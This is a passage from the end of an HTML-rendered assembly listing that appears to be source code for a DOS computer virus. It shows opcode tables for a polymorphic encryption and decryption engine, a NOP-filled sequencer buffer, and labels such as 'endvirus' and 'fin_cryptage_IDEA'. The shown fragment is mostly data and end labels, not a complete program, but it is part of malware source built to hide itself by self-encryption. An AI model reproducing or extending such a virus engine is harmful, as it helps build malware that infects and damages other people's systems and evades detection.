        </span><span class="sc6">ret</span><span class="sc0">

        </span><span class="sc1">;  XOR   SUB   ADD   ROL   ROR   NOT   NEG   INC   DEC</span><span class="sc0">
</span><span class="sc5">enc_opers</span><span class="sc0">       </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc2">00034</span><span class="sc4">,</span><span class="sc2">0002c</span><span class="sc4">,</span><span class="sc2">00004</span><span class="sc4">,</span><span class="sc2">0c0d0</span><span class="sc4">,</span><span class="sc2">0c8d0</span><span class="sc4">,</span><span class="sc2">0d0f6</span><span class="sc4">,</span><span class="sc2">0d8f6</span><span class="sc4">,</span><span class="sc2">0c0fe</span><span class="sc4">,</span><span class="sc2">0c8fe</span><span class="sc0">
        </span><span class="sc1">;  XOR   ADD   SUB   ROR   ROL   NOT   NEG   DEC   INC</span><span class="sc0">
</span><span class="sc5">dec_opers</span><span class="sc0">       </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc2">00034</span><span class="sc4">,</span><span class="sc2">00004</span><span class="sc4">,</span><span class="sc2">0002c</span><span class="sc4">,</span><span class="sc2">0c8d0</span><span class="sc4">,</span><span class="sc2">0c0d0</span><span class="sc4">,</span><span class="sc2">0d0f6</span><span class="sc4">,</span><span class="sc2">0d8f6</span><span class="sc4">,</span><span class="sc2">0c8fe</span><span class="sc4">,</span><span class="sc2">0c0fe</span><span class="sc0">

</span><span class="sc5">enc_sequencer</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc2">10</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc2">9090</span><span class="sc4">)</span><span class="sc0">
</span><span class="sc5">end_sequencer</span><span class="sc0">   </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc2">2</span><span class="sc0">
</span><span class="sc5">len_sequencer</span><span class="sc0">   </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc5">enc_sequencer</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc5">pointer_reg</span><span class="sc0">     </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">com_fse</span><span class="sc0">         </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">taille_fse</span><span class="sc0">       </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">

</span><span class="sc5">isole</span><span class="sc0">  </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc2">90h</span><span class="sc4">)</span><span class="sc0">

</span><span class="sc5">fin_cryptage_IDEA</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc5">fin_cryptage_NOKEY</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc5">endvirus</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc5">heap</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc5">code</span><span class="sc0">    </span><span class="sc9">ends</span><span class="sc0">
    </span><span class="sc9">end</span><span class="sc0">     </span><span class="sc5">start</span><span class="sc0">
</span></div></body>
</html>
